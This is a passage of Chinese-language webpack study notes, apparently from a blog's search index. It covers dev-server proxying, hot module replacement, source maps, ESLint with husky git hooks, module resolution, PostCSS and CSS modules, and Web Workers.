{&#x2F;&#x2F; …devServer: {contentBase: path.join(__dirname, ‘dist’),compress: true,port: 9000,proxy: {‘&#x2F;api’: {target: ‘https://api.github.com‘}}&#x2F;&#x2F; …}}\n其中，devServetr里面proxy则是关于代理的配置，该属性为对象的形式，对象中每一个属性就是一个代理的规则匹配。属性的名称是需要被代理的请求路径前缀，一般为了辨别都会设置前缀为 &#x2F;api，值为对应的代理匹配规则，对应如下： - target：表示的是代理到的目标地址。 - pathRewrite：默认情况下，我们的 &#x2F;api-hy 也会被写入到URL中，如果希望删除，可以使用pathRewrite。 - secure：默认情况下不接收转发到https的服务器上，如果希望支持，可以设置为false。 - changeOrigin：它表示是否更新代理后请求的 headers 中host地址。4.2 原理proxy工作原理实质上是利用http-proxy-middleware 这个http代理中间件，实现请求转发给其他服务器。比如下面的例子：const express &#x3D; require(‘express’);const proxy &#x3D; require(‘http-proxy-middleware’);const app &#x3D; express();app.use(‘&#x2F;api’, proxy({target: ‘http://www.example.org‘, changeOrigin: true}));app.listen(3000);&#x2F;&#x2F; http://localhost:3000/api/foo/bar -&gt; http://www.example.org/api/foo/bar\n在上面的例子中，本地地址为http://localhost:3000，该浏览器发送一个前缀带有/api标识的请求到服务端获取数据，但响应这个请求的服务器只是将请求转发到另一台服务器中。4.3 跨域在开发阶段， webpack-dev-server 会启动一个本地开发服务器，所以我们的应用在开发阶段是独立运行在 localhost 的一个端口上，而后端服务又是运行在另外一个地址上。所以在开发阶段中，由于浏览器同源策略的原因，当本地访问后端就会出现跨域请求的问题。解决这种问题时，只需要设置webpack proxy代理即可。当本地发送请求的时候，代理服务器响应该请求，并将请求转发到目标服务器，目标服务器响应数据后再将数据返回给代理服务器，最终再由代理服务器将数据响应给本地，原理图如下：\n在代理服务器传递数据给本地浏览器的过程中，两者同源，并不存在跨域行为，这时候浏览器就能\n5. webpack-dev-server 和 http服务器的区别webpack-dev-server使用内存来存储webpack开发环境下的打包文件，并且可以使用模块热更新，比传统的http服务对开发更加有效。提高Webpack的构建速度\n6. webpack的热更新原理是怎样的？\nWebpack 通过 Watch 模式可以侦听文件的变化，当文件发生改变时，会根据配置进行重新编译（Compile），并将编译后的代码保存在内存中。\nwebpack-dev-server 也会对文件变化进行监控（需要配置 devServer.watchContentBase &#x3D; true），但不会进行重新编译，而是监听这些配置文件中静态文件的变化，变化后会通知浏览器进行直接刷新，而不是 HMR。\n在浏览器和服务端之间有一个通过 SocketJs 建立的 websocket 长连接。webpack-dev-server 会将 Webpack 编译打包时的各个阶段的状态信息和 hash 值一并告知 webpack-dev-server&#x2F;client（位于浏览器端）。\n但是 webpack-dev-server&#x2F;client 并不能够请求更新的代码，而是把这些工作交给了 webpack&#x2F;hot&#x2F;dev-server，webpack&#x2F;hot&#x2F;dev-server 的工作就是根据 webpack-dev-server&#x2F;client 传来的信息以及 dev-server 的配置决定是刷新浏览器还是 HMR。\nHotModuleReplacement.runtime 是客户端 HMR 的中枢，它接收到 webpack&#x2F;hot&#x2F;dev-server 传递的新模块的 hash 值，通过 JsonpMainTemplate.runtime 向 webpack-dev-server 发送 Ajax 请求获取到返回的 Json，该 Json 包含了所有要更新的模块的 hash 值，之后通过 Jsonp 请求，获取到最新的模块代码。\n接下来，HotModulePlugin 将会对新旧模块进行对比，决定是否更新模块，在决定更新模块后，检查模块之间的依赖关系，更新模块的同时更新模块间的依赖引用。\n如果 HMR 失败，则通过刷新浏览器来获取最新打包代码。\n\n六、 基本配置1. entry的值有几种数据类型？字符串（单入口）数组（多入口）object(object中的key在webpack里相当于此入口的name)\n2. webpack如何配置多入口文件？● 配置多入口entry○● 配置出口output○ filename 中的 [name] 对应入口的文件名；○ contentHash 会命中缓存，提高性能；○● 配置插件htmlWebpackPlugin，生成多页面○ htmlWebpackPlugin 插件会生成页面。○ chunk 为代码块，默认引入 entry 中所有文件。○\n3. webpack.config.js能不能做拆分？可以将webpack.config.js 配置文件进行分开。分成三个配置文件，如下：\n\nwebpack.base.config.js：两个环境公共的部分\n\nwebpack.dev.config.js：开发环境独有的配置\nwebpack.prod.config.js`：生产环境独有的配置\n\noutput的对象中的常见属性有哪些?\noutput 是一个 object 对象，其中包含一系列的配置项，其中比较重要的是 filename 和 path。\n● output.filename：配置输出文件的名称，指定一个 string 类型的值。如果只有一个输出文件，则可以把它写成静态不变的。\n● output.path ：配置输出文件存放在本地的目录，是一个 string 类型的绝对路径。通常通过 Node.js 的 path 模块去获取绝对路径。\n在 webpack.config.js 配置文件中，一个 entry 对应一个 output。\n七、 区别1. babel-runtime和babel-polyfill的区别● babel-polyfill\n○ 原理是当运行环境中并没有实现的一些方法，babel-polyfill 会给其做兼容。 但是这样做也有一个缺点，就是会污染全局变量，而且项目打包以后体积会增大很多，因为把整个依赖包也搭了进去。所以并不推荐在一些方法类库中去使用。\n○ babel-polyfill 可以用来转码，因为 babel-polyfill 是直接在原型链上增加方法。\n● babel-runtime\n○ 为了不污染全局对象和内置的对象原型，但是又想体验使用新鲜语法的快感。就可以配合使用babel-runtime和babel-plugin-transform-runtime。 比如当前运行环境不支持promise，可以通过引入babel-runtime&#x2F;core-js&#x2F;promise来获取promise， 或者通过babel-plugin-transform-runtime自动重写你的promise。也许有人会奇怪，为什么会有两个runtime插件，其实是有历史原因的：刚开始开始只有babel-runtime插件，但是用起来很不方便，在代码中直接引入helper 函数，意味着不能共享，造成最终打包出来的文件里有很多重复的helper代码。所以，Babel又开发了babel-plugin-transform-runtime，这个模块会将我们的代码重写，如将Promise重写成_Promise（只是打比方），然后引入_Promise helper函数。这样就避免了重复打包代码和手动引入模块的痛苦。\n○ babel-runtime 不能转码实例方法\n\n\n2. 除了Webpack外，你还了解哪些模块管理工具webpack:就目前而言，webpack已是最常用的打包工具，webpack是基于入口的。webpack会自动地递归解析入口所需要加载的所有资源文件，然后用不同的Loader来处理不同的文件，用Plugin来扩展webpack功能。gulp：gulp是一个前端自动化构建工具，强调的是前端开发的工作流程，可以通过配置一系列的task，第一task处理的事情（如代码压缩，合并，编译以及浏览器实时更新等）。然后定义这些执行顺序，来让glup执行这些task，从而构建项目的整个开发流程。自动化构建工具并不能把所有的模块打包到一起，也不能构建不同模块之间的依赖关系。\ngrunt：是基于任务和流（Task、Stream）的。类似jQuery，找到一个（或一类）文件，对其做一系列链式操作，更新流上的数据， 整条链式操作构成了一个任务，多个任务就构成了整个web的构建流程。Rollup\n\nRollup 是一款 ES Modules 打包器， 从作用上来看，Rollup 与 Webpack 非常类似。不过相比于 Webpack，Rollup要小巧的多现在很多我们熟知的库都都使用它进行打包，比如：Vue、React和three.js等ParcelParcel ，是一款完全零配置的前端打包器，它提供了 “傻瓜式” 的使用体验，只需了解简单的命令，就能构建前端应用程序Parcel 跟 Webpack 一样都支持以任意类型文件作为打包入口，但建议使用 HTML文件作为入口，该HTML文件像平时一样正常编写代码、引用资源。模块化是一种处理复杂系统分解为更好的可管理模块的方式。可以用来分割、组织和打包应用。每个模块完成一个特定的子功能，所有的模块按某种方法组装起来，成为一个整体。在前端领域中，除了Webpack外，比较流行的模块打包工具还包括Rollup、Parcel、snowpack和最近风靡的Vite。2.1. RollupRollup 是一款 ES Modules 打包器，可以将小块代码编译成大块复杂的代码，例如 library 或应用程序。从作用上来看，Rollup 与 Webpack 非常类似。不过相比于 Webpack，Rollup 要小巧的多。现在很多苦都使用它进行打包，比如：Vue、React和three.js等。使用之前，可以使用npm install —global rollup 命令进行安装。Rollup 可以通过命令行接口(command line interface)配合可选配置文件(optional configuration file)来调用，或者可以通过 JavaScript API来调用。运行 rollup —help 可以查看可用的选项和参数。2.2. ParcelParcel ，是一款完全零配置的前端打包器，它提供了 “傻瓜式” 的使用体验，只需了解简单的命令，就能构建前端应用程序。2.3. ViteVite是Vue的作者尤雨溪开发的Web开发构建工具，它是一个基于浏览器原生ES模块导入的开发服务器，在开发环境下，利用浏览器去解析import，在服务器端按需编译返回，完全跳过了打包这个概念，服务器随启随用。同时不仅对Vue文件提供了支持，还支持热更新，而且热更新的速度不会随着模块增多而变慢。Vite具有以下特点： - 快速的冷启动 - 即时热模块更新（HMR，Hot Module Replacement） - 真正按需编译Vite由两部分组成： - 一个开发服务器，它基于 原生 ES 模块 提供了丰富的内建功能，如速度快到惊人的 [模块热更新HMR。 - 一套构建指令，它使用 Rollup打包你的代码，并且它是预配置的，可以输出用于生产环境的优化过的静态资源。Vite在开发阶段可以直接启动开发服务器，不需要进行打包操作，也就意味着不需要分析模块的依赖、不需要编译，因此启动速度非常快。当浏览器请求某个模块的时候，根据需要对模块的内容进行编译，大大缩短了编译时间。工作原理如下图所示。在热模块HMR方面，当修改一个模块的时候，仅需让浏览器重新请求该模块即可，无须像Webpack那样需要把该模块的相关依赖模块全部编译一次，因此效率也更高。\nwebpack，rollup，parcel优劣？(了解)对比WebpackRollupParcel功能\n\n为处理资源管理和分割代码而生，可以用来处理任何类型的文件，灵活，插件多。用标准化的格式（es6）来写代码，通过减少死代码尽可能地缩小包体积。用标准化的格式（es6）来写代码，通过减少死代码尽可能地缩小包体积。配置webpack需要配config文件，指明entry, output, plugin，transformations。rollup需要配config文件，指明entry, output, plugin，transformations。rollup 有对import&#x2F;export所做的node polyfills，webpack没有。rollup支持相对路径，而webpack没有，所以得使用\nparcel则是完全开箱可用的，不用配置。\n\n入口文件webpack只支持js文件作为入口文件，如果要以其他格式的文件作为入口，比如html文件为入口，如要加第三方Plugin。rollup可以用html作为入口文件，但也需要plugin，比如rollup-plugin-html-entry。parcel可以用index.html作为入口文件，而且它会通过看index.html的script tag里包含的什么自己找到要打包生成哪些js文件。transformationstransformations指的是把其他文件转化成js文件的过程，需要经过transformation才能够被打包。webpack使用Loaders来处理。rollup使用plugins来处理。parcel会自动去转换，当找到配置文件比如.babelrc, .postcssrc后就会自动转。摇树优化摇树优化是webpack的一大特性。需要1，用import&#x2F;export语法，2，在package.json中加副作用的入口，3，加上支持去除死代码的缩小器（uglifyjsplugin）。rollup会统计引入的代码并排除掉那些没有被用到的。这使您可以在现有工具和模块的基础上构建，而无需添加额外的依赖项或膨胀项目的大小。parcel不支持摇树优化。dev serverwebpack用webpack-dev-server。\nrollup用rollup-plugin-serve和rollup-plugin-livereload共同作用。parcel内置的有dev server热更新webpack的 wepack-dev-server支持hot模式。rollup不支持hmr。parcel有内置的hmr。代码分割webpack通过在entry中手动设置，使用CommonsChunkPlugin，和模块内的内联函数动态引入来做代码分割。rollup有实验性的代码分割特性。它是用es模块在浏览器中的模块加载机制本身来分割代码的。需要把experimentalCodeSplitting 和 experimentalDynamicImport 设为true。parcel支持0配置的代码分割。主要是通过动态improt。\n","categories":["前端工程化"],"tags":["webpack"]},{"title":"webpack高级","url":"/2020/11/28/webpack/webpack%E9%AB%98%E7%BA%A7/","content":"webpack高级篇完善配置以及常用并强大的工具\n一.如何提高开发效率与完善团队开发规范source-mapdebug  将打包好的bundle.js里的报错内容和我们源代码index.js文件进行关联webpack已经内置了source-map的功能   只要我们简单的配置一下就可以开启它了\ndevtool:&quot;inline-source-map&quot;  //通过devtool去复制一个值就可以开启 source-map\n七种source-map：\nnpm init -ynpm install webpack webpack-cli webpack-dev-server html-webpack-plugin -D\neval模式：每个module会封装到eval里包裹起来执行，并且会在末尾追加注释 &#x2F;&#x2F;@sourceURL默认情况下 没有配置source-map  webpack会帮助我们在开发环境下面去设置一个source-map默认值，eval。所以我们在浏览器上才能精准的锁定我们代码的行数。\ndevtool:false      // 关闭source-map   浏览器锁定的是在打包后bundle.js文件中的位置devtool:&#x27;eval&#x27;devtool:&#x27;source-map&#x27;    //它可以生成一个SourceMap我文件其他的功能会保持eval的功能devtool:&#x27;hidden-source-map&#x27;  //和source-map一样，但不会在bundle末尾追加注释      那么就不能有锁定代码行数了   但是它会生成一个.map文件  连着不关联了devtool:&#x27;inline-source-map&#x27;   //生成一个DataUrl形式的SourceMap文件  没有map文件了  指向data64格式devtool:&#x27;eval-source-map&#x27;   // 每个module会通过eval()来执行，并且生成一个DataUrl形式的SourceMapdevtool:&#x27;cheap-source-map&#x27;   // 它会生成一个没有列信息的SourceMaps文件，不包含loader的sourcemap    只保留代码的行数不去记录代码的列数    可以减少生成的map文件的大小devtool:&#x27;cheap-module-source-map&#x27; //生成一个没有列信息的SourceMaps文件，同时loader的sourcemap也被简化为只包含对应行的信息。       **推荐使用**\n\ndevServer在开发环境下我们往往要启动一个web服务，方便我们模拟一个用户从浏览器中访问我们的web服务，读取我们的打包产物，以观测我们的代码在客户端的表现。webpack内置了这样的功能，我们只需要简单的配置就可以开启它了。npm install webpack-dev-server -D\nconst path = require(&#x27;path&#x27;)//为了在浏览器看到效果配置插件const HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;)devServer:&#123;\tstatic: path.resolve(__dirname,&#x27;./dist&#x27;)  // 指向我们当前服务的物理路径\tcompress:true  // 可以设置我们是不是在服务器端进行代码压缩 使他在传输过程中可以减少传输的这个数据的大小浏览器请求头   Content-Encoding:gzip  保证我们从服务器到浏览器传输的过程中这个文件是压缩的。从而提高我们的传输效率。\tport :3000  //  配置端口号\t// 添加响应头 在有些场景需求下，我们需要通过http传输给我们浏览器，为所有响应添加headers，来对资源的请求和响应打入标志，以便做一些安全规范，或者方便发生异常后做请求的链路追踪\theaders:&#123;\t\t&#x27;X-Access-token&#x27;:&#x27;啊师傅撒大附件是辣的回复&#x27;\t&#125;\t//开启代理，在我们打包出来的js bundle里有时会含有一些对特定接口的网络请求(ajax/fetch),比如：我们的客户端地址实在http://localhost:3000下，加入我们的接口来自http://localhost:4001/,那么毫无疑问，此时的控制台会报错来提示你跨域。  解决：在开发环境下，我们可以使用devServer自带的proxy功能。\tconst http = require(&#x27;http&#x27;)\tcosnt app = http.createServer((request,response)=&gt;&#123;\t\tif (request.url===&#x27;/api/hello&#x27;)&#123;\t\t\tresponse.end(&#x27;hello mode&#x27;)\t\t&#125;\t&#125;) 创建服务\tapp.listen(9000，&#x27;服务器的名字域名localhost可以省略&#x27;,()=&gt;&#123;\t\tconsole.log(&#x27;提醒用户  9000端口开放&#x27;)\t&#125;)  //监听app\tnode server.js启动服务\tfetch(&#x27;/api/hello&#x27;) //返回一个promise\t.then(response=&gt;response.text) // 将返回内容变成一个文本\t.then(reuslt=&gt;&#123;\t\tconsole.log(&#x27;result&#x27;)\t&#125;)\tpeoxy解决跨域\tproxy:&#123;  //proxy对象 里边可以写很多的所谓的访问的路径（暗号）\t\t&#x27;/api&#x27;:&#x27;http://localhost:9000&#x27;  //当用户请求资源为/api时  把它指向到一个新的服务器上去\t&#125;\t//  https配置  我们在本地访问时将http变为https\thttps:true   //由于默认配置使用的时自签名证书  所以有得浏览器会告诉你时不安全的，但我们依然可以继续访问它。当然我们也可以提供自己的证书\thttps:&#123;\t\tcacert:&quot;./server.pem&quot;,\t\tpfx:&quot;./server.pfx&quot;,\t\tkey:&quot;./server.key&quot;,\t\tcert:&#x27;./server.crt&#x27;,\t\tpassphrase:&quot;webpack-dev-server&quot;,\t\trequestCert:true\t&#125;\t// http2 自带https的自签名证书  仍然可以通过https来访问我们的项目\thttp2:true\t// historyApiFallback  如果我们的应用是个SPA（单页面应用），但路由到/some时（可以直接在地址栏里输入），会发现此时刷新页面后，控制台会报错。  原因：浏览器把这个路由当作了静态资源地址去请求，然后我们并没有打包出/some这样的资源，所以这个访问时404。  解决：可以通过配置来提供页面代替任何404的静态资源。\thistoryApiFallback:true\t// 此时重启服务刷新后发现请求变成了index.html。当然，在多数业务场景下，我们需要根据不同的访问路径定制替代的页面，  可以使用rewrites这个配置项\thistoryApiFallback:&#123;\t\trewrites:[\t\t\t&#123;form:/^\\/$/,to:&#x27;asd.html&#x27;&#125;,  //正则获取路径\t\t]\t&#125;\t//开发服务器主机   如果你在开发环境中起了一个devserver服务，并期望你的同事能访问它，\tdevServer:&#123;\t\thost:0.0.0.0\t&#125;//这是如果你的同事和你处于一个局域网的话，就可以通过局域网ip来访问你的服务了&#125;plugins:[\tnew HtmlWebpackPlugin()]\n\n模块热替换与热加载模块热替换：(HMR - hot module replacement)功能会在应用程序运行过程中，替换 添加或删除 模块，而无需重新加载整个页面\ndevServer:&#123;\thot:true&#125;if (module.hot)&#123;\tmodule.hot.accept(&#x27;./input.js&#x27;,()=&gt;&#123;\t\tconsole.log(123)\t&#125;)&#125;//css并不需要做这个开关  是因为css-loader已经帮助我们完成这个工作了\n热加载（文件更新时，自动刷新我们的服务和页面）新版的webpack-dev-server默认开启热加载的功能，它对应的参数是devServer.liveReload ,默认为true。  如果想要关掉它,liveReload这是为false同时也要关掉hot\nEslinteslint是用来扫描我们所写的代码是否符合规范的工具，往往我们的项目是多人协作开发的，我们期望同一的代码规范，这时候可以让eslint来对我们进行约束。严格意义上来说，eslint配置跟webpack无关，但在工程化环境中，它往往是不可或缺的。npx exlint –init会给我们三个选项（说明我们在使用的时候用那种方式）：1.仅仅检查语法错误，2.不但可以检查语法而且还可以发现问题，3.既可以检查语法，发现问题，还可以规范我们代码的格式。之后是问我们在项目中到底使用那种模块化的开发方式：   es6  commonJS  什么都不用我们在项目中使用的是那种框架：React  Vue.js  没有使用   第三篇讲解webpack如何与react  vue进行合作项目中是否使用ts代码是运行在哪里的   browser浏览器  还是node后端在项目中到底如何去配置代码规范   1.选择一些流行的代码格式（使用第一个）， 2.实现一问一答的方式来配置，3.导入一个我们自有的文件配置文件放在什么地方  javascript  yaml   json生成.eslintrc.json文件env：脚本的运行环境extends  ：检查代码格式的文件parserOptions ： 指定ecmaVersion的版本  sourceType：modulerules：启用规则以及各自的错误级globals：可以在执行脚本的期间访问一些额外的全局变量，这些全局变量是不在环境中定义的变量。npx eslint 文件夹或文件使用vscode 的eslint插件  就会告诉我们哪里不符合规范 出现了问题\n&#123;\t&quot;rules&quot;:&#123;\t\t&quot;no-console&quot;:0, //关闭no-console提示\t&#125;&#125;\n结合webpack来实现eslint我们期望eslint能够实时提示报错而不必等待执行命令，这个功能可以通过给自己的IDE（代码编辑器）安装对应的eslint插件来实现，然而，不是每个IDE都有插件，如果不想使用插件，又想实现实时提示报错，那么我们可以结合webpack的打包编译功能来实现。在打包js文件之前，通过eslint-loader以及babel-loader来进行处理\ndevServer:&#123;\tclient:&#123;\t\toverlay:false,   // 浏览器不在有覆盖层eslint错误提示\t&#125;&#125;module:&#123;\trules:[\t\t&#123;\t\t\ttest:/\\.js$/,\t\t\tuse:[&#x27;babel-loader&#x27;,&#x27;eslint-loader&#x27;]\t\t&#125;\t]&#125;\n\ngit-hooks与husky为了保证团队里的开发人员提交的代码符合规范，我们可以在开发者上传代码的时候进行校验。我们常用husky来协助进行代码提交时的eslint校验。在使用husky前，我们先来研究一下git-hooks.husky时基于git-hooks git的钩子来实现的\ngit –versiongit initls -la.gitignore  在git提交时有一些文件不需要提交**&#x2F;node_modulesgit status  查看当前git的状态   可以看到文件都没有进行本地的仓库的添加的            可以查看到修改了那些文件git add . 添加到缓存区   git commit -m ‘init’  所有代码添加到了本地仓库   并没有关联远端的仓库cd .git  ls -la   cd hooks  ls -la.sample的扩展名文件，这些文件都是git的hooks    hook就是我们在执行命令的时候需要提前或者之后去执行的一些命令这些命令时自动执行的   只要配置好   git会帮助我们运行。需求：在每次git提交的时候来检查代码的问题。   可以运行eslint  钩子可以采用pre-commit-samplecat pre-commit-sample   浏览文件   如果想要指定它或者时让他生效我们可以修改文件名  .sample是不能起作用的我们想要起作用必须重新创建一个文件pre-committouch  pre-commit   这个文件我们就可以事先写一写shell脚本  当commit实行的时候这些脚本就会被提前运行vim pre&#x3D;commit       &#x2F;&#x2F;编辑这个文件   i进行输入  echo pre-commit   esc退出  :wq修改文件的读写权限  chmod +x .&#x2F;pre-commit   &#x2F;&#x2F;添加写权限脚本  ：  d+d删除当前行  i（insert）插入   npx eslint .&#x2F;src在团队开发时不对代码做任何处理    只有在我们代码提交到git仓库时在进行校验问题：如果把git的配置放在.git文件夹里那个文件夹每个人的配置都是不一样的   也没有办法把配置放到git仓库里   那我们需要把这个配置放置到项目的根目录下文件以.开头表示这个文件是隐藏的.mygithooks  .pre-commit   希望我们在git提交的时候读取的不是我们在git默认的hooks里面配置的pre-commit 而是读取我们项目中的pre-commit   通过git配置实现   git config core.hooksPash .mygithooks  会自动读取文件夹中约定好的pre-commit这个文件名vim .git&#x2F;config   &#x2F;&#x2F;查看我们刚才通过命令行添加的命令chmod +x .mygithooks&#x2F;pre-commit   ls -la查看文件权限现在都是通过手工去完成的    我们可以通过现成的工具(husky)来完成vim .git&#x2F;config   删除刚才的配置npm install husky -Dnpx husky install &#x2F;&#x2F;执行  让我们的命令行hook生效   会在当天目录下面创建.husky文件夹自己配置一个脚本 “prepare” : husky install  它会实现到我们的一些命令执行之前去安装我们的huskynpx husky add .husky&#x2F;per-commit 在.husky下创建pre-commit文件   npx eslint .&#x2F;src添加权限\n二.模块与依赖在模块化的编程中  开发者会将程序分解为功能离散的一些文件   我们把这些文件称之为模块  每个模块都很轻量  这使得我们项目的验证  调试以及测试会变得轻而易举。  这些精心编写得模块提供了可靠的抽象和封装界限。使得我们应用程序的每个模块都具备了调理清晰的设计和明确的目的。nodejs从一开始就支持模块化的编程  但是浏览器端的模块化还在缓慢的支持中。大多数浏览器支持esm模块化。能在webpack工程化的环境里成功导入的模块都应该视做为webpack模块。与nodejs项目webpack模块能以各种方式来表达它的利害关系。es6 import from          nodejs  module  require              AMD   define  requirecss,scss,less,assets这些文件里的@import语句     和样式里的url资源  这些都是webpack应用的模块webpack模块解析简易原理：webpack将js,css,less,scss,img,html等文件  通过loader+module(内置模块)  的方法解析成模块化的文件。这个打包编译的解析过程是怎么完成的：webpack执行会返回一个描述webpack打包编译的整个流程的一个对象我们将这个对象称之为compiler,compiler对象描述的是整个webpack打包的流程，它内置打包状态，随着打包过程的进行  状态也实施的发生变化。同时会触发相应状态的webpack生命周期钩子，我们可以将它类比成一个promise对象，这个状态从打包前，打包中到打包完成或者打包失败都是通过这个过程完成的，每一个webpack打包都是创建一个compiler对象，它会走完整个声明周期的过程。而webpack中所有的模块解析都是compiler对象内置模块的解析器去做的，通过这个对象的属性resolvers解析器主题主题功能就是解析模块它是基于enhanced-resolve这个包来实现的，在webpack中无论使用怎样的模块引用语句本质其实都是调用这个包的api来进行模块的构建解析的\n模块解析(resolve)webpack是通过Resolves实现了模块之间的依赖和引用。在打包的时候，webpack使用enhanced-resolve来解析文件路径（webpack_resolver的代码实现很有思想，webpack基于次进行treeshaking。）webpack可以解析三种文件路径：1.绝对路径（相对于项目的根目录&#x2F;）    2.相对路径（相对于当前文件.&#x2F;）    3.模块路径（全局的node_modules文件）(不用&#x2F;  或  .&#x2F;它会自动到node_modules中找模块)可以给某个路径或某个文件夹下的目录去起个别名\nconst path = require(&#x27;path&#x27;)resolve:&#123;\talias:&#123;\t\t&#x27;@&#x27;: path.resulve(__dirname,&#x27;./src&#x27;)   // @指向src目录\t&#125;,\textensions: [&#x27;.json&#x27;,&#x27;js&#x27;,&#x27;.vue&#x27;]   //优先请求 .json的后缀。(不配置该选项默认请求.js)&#125;\n\n外部扩展(Externals)有时候我们会为了减小bundle的体积，从而把一些不变的第三方库用cdn的形式引入进来，比如jquery：index.html。\nexternalsType:&#x27;script&#x27;,externals:&#123;   //他是一个对象   可以去定义我们的外部一些第三方包\tjquery:&#x27;jQuery($)&#x27;      //key 的名字一定要和  其他地方引用的报名一样，值是我们在window对象上面去暴露的一个对象        // 无法正常运行  jquery没有定义    需要在index.html收到导入script标签\tjquery:[\t\t&#x27;cdn地址&#x27;,   //jquery  script标签  将来要放到的页面的连接\t\t&#x27;jQuery($)&#x27;   //表示  这个script在浏览器上面暴露的一个对象\t]&#125;\n\n依赖图(dependency graph)每当一个文件依赖另一个文件时，webpack会直接将文件视为存在依赖关系。这使得webpack可以获取非代码资源，如image或web字体等，并会把他们作为 依赖 提供给应用程序，当webpack开始工作时，它会根据我们写好的配置，从 入口（entry）开始，webpack会递归的构建一个 依赖关系图，这个依赖关系图包含着应用程序中所需的每个模块，然后将所有模块打包为bundle(也就是output配置项)单纯将可能很抽象，我们更期望能够可视化打包产物的依赖图，  bundle分析工具：官网分析工具   第三方工具：webpack-chart   webpack-visualizer    webpack-bundle-analyzer    webpack bundle  optimize helper       bundle-statsnpm install webpack-bundle-analyzer -D\nconst &#123; BundleAnalyzerPlugin &#125; = require(&#x27;webpack-bundle-analyzer&#x27;)plugins:&#123;\tnew BundleAnalyzerPlugin()&#125;\n\n三.扩展功能PostCSS和css模块，Web Works,Typescript\npostcss : 1.可以给样式添加前缀兼容浏览器   2.可以在样式里书写一些关于嵌套的功能  它可以编译成浏览器能够识别的样式。css模块：解决页面class引用次数多，或引用别人的样式 名重复，可以使用css模块\nnpm install postcss-loader -Dnpm install autoprefixer -D   //帮助我们去加载一些样式的前缀webpack.config.jsmodule:&#123;\trules:[\t\t&#123;\t\t\ttest:/\\.css$/,\t\t\tuse:[\t\t\t\t&#x27;style-loader&#x27;,\t\t\t\t&#x27;css-loader&#x27;,\t\t\t\t&#x27;postcss-loader&#x27;\t\t\t]\t\t&#125;\t]&#125;postcss.config.jsmodule.exports = &#123;\tplugins:[\t\trequire(&#x27;autoprefixer&#x27;),\t\trequire(&#x27;postcss-nested&#x27;)   //嵌套\t]&#125;package.json&quot;browerlist&quot;:[\t&quot;&gt;1%&quot;,   //应用在全球浏览器大于1%的浏览器上\t&quot;last 2 versions&quot;  //每个浏览器的最新的两个版本]// css模块实现rules:[\t&#123;\t\ttest:/\\.css$/,\t\tuse:[\t\t\t&#x27;tyle-loader&#x27;,\t\t\t&#123;\t\t\t\tloader:&#x27;css-loader&#x27;,\t\t\t\toptions:&#123;\t\t\t\t\tmodules:true        //开启css模块\t\t\t\t&#125;\t\t\t&#125;,\t\t\t&#x27;postcss-loader&#x27;,\t\t]\t&#125;]//获取hash字符串  将css文件当成一个模块import style from &#x27;./asasd.css&#x27;console.log(style)样式为：style.class名配置部分开启css模块  css module模式  ，全局样式.global不开启css模块 不同模式。// css module&#123; test: new RegExp(`^(?!.*\\\\.global).*\\\\.css`), use: [ &#123;   loader: &#x27;style-loader&#x27; &#125;， &#123;   loader: &#x27;css-loader&#x27;,   options: &#123;    modules: true,    localIdentName: &#x27;[hash:base64:6]&#x27;  &#125; &#125;, &#123;   loader: &#x27;postcss-loader&#x27; &#125;], exclude:[path.resolve(__dirname, &#x27;..&#x27;, &#x27;node_modules&#x27;)]&#125;// 普通模式&#123; test: new RegExp(`^(.*\\\\.global).*\\\\.css`), use: [ &#123;   loader: &#x27;style-loader&#x27; &#125;， &#123;   loader: &#x27;css-loader&#x27;, &#125;, &#123;   loader: &#x27;postcss-loader&#x27; &#125;], exclude:[path.resolve(__dirname, &#x27;..&#x27;, &#x27;node_modules&#x27;)]&#125;\n\nWeb Works有时我们需要在客户端进行大量的运算，但又不想让它阻塞我们的js主线程。你可能第一时间考虑到的是异步。但事实上，运算量过大(执行时间过长)的异步也会阻塞js事件循环，甚至会导致浏览器假死状态。这时候，HTML5的新特性 WebWorker就派上了用场。在此之前，我们简单的了解下这个特性。html5之前，打开一个常规的网页，浏览器会启用几个线程？一般而言，至少存在三个线程(公用线程不计入在内):分别是js引擎线程(处理js)、GUI渲染线程(渲染页面)、浏览器事件触发线程(控制交互)。当一段JS脚本长时间占用着处理机,就会挂起浏览器的GUI更新，而后面的事件响应也被排在队列中得不到处理，从而造成了浏览器被锁定进入假死状态。现在如果遇到了这种情况，我们可以做的不仅仅是优化代码————html5提供了解决方案，webworker。webWorkers提供了js的后台处理线程的API，它允许将复杂耗时的单纯js逻辑处理放在浏览器后台线程中进行处理，让js线程不阻塞UI线程的渲染。多个线程间也是可以通过相同的方法进行数据传递。它的使用方式如下：也就是说，需要单独写一个js脚本，然后使用new Worker来创建一个Work线程实例。这意味着并不是将这个脚本当做一个模块引入进来，而是单独开一个线程去执行这个脚本。\n   loader: &#x27;css-loader&#x27;, &#125;, &#123;   loader: &#x27;postcss-loader&#x27; &#125;], exclude:[path.resolve(__dirname, &#x27;..&#x27;, &#x27;node_modules&#x27;)]&#125;\n&#x2F;&#x2F;new Worker(scriptURL: string | URL, options?: WorkerOptions)new Worker(“someWorker.js”);\n我们知道，常规模式下，我们的webpack工程化环境只会打包出一个bundle.js，那我们的worker脚本怎么办？也许你会想到设置多入口(Entry)多出口(ouotput)的方式。事实上不需要那么麻烦，webpack4的时候就提供了worker-loader专门配置webWorker。令人开心的是，webpack5之后就不需要用loader啦，因为webpack5内置了这个功能。我们来试验一下：第一步创建一个work脚本 work.js,我们甚至不需要写任何内容，我们的重点不是webWorker的使用，而是在webpack环境中使用这个特性。当然，也可以写点什么，比如：\nself.onmessage = (&#123; data: &#123; question &#125; &#125;) =&gt; &#123; self.postMessage(&#123;  answer: 42,&#125;)&#125;\n在 index.js 中使用它\n// 下面的代码属于业务逻辑const worker = new Worker(new URL(&#x27;./work.js&#x27;, import.meta.url));worker.postMessage(&#123; question:  &#x27;hi，那边的workder线程，请告诉我今天的幸运数字是多少？&#x27;,&#125;);worker.onmessage = (&#123; data: &#123; answer &#125; &#125;) =&gt; &#123; console.log(answer);&#125;;千\n(import.meta.url这个参数能够锁定我们当前的这个模块——注意，它不能在commonjs中使用。)这时候我们执行打包命令，会发现,dist目录下除了bundle.js之外，还有另外一个xxx.bundle.js!这说明我们的webpack5自动的将被new Work使用的脚本单独打出了一个bundle。我们加上刚才的问答代码，执行npm run dev，发现它是能够正常工作。并且在network里也可以发现多了一个src_worker_js.bundle.js。总结：webpack5以来内置了很多功能，让我们不需要过多的配置，比如之前讲过的hot模式，和现在的web 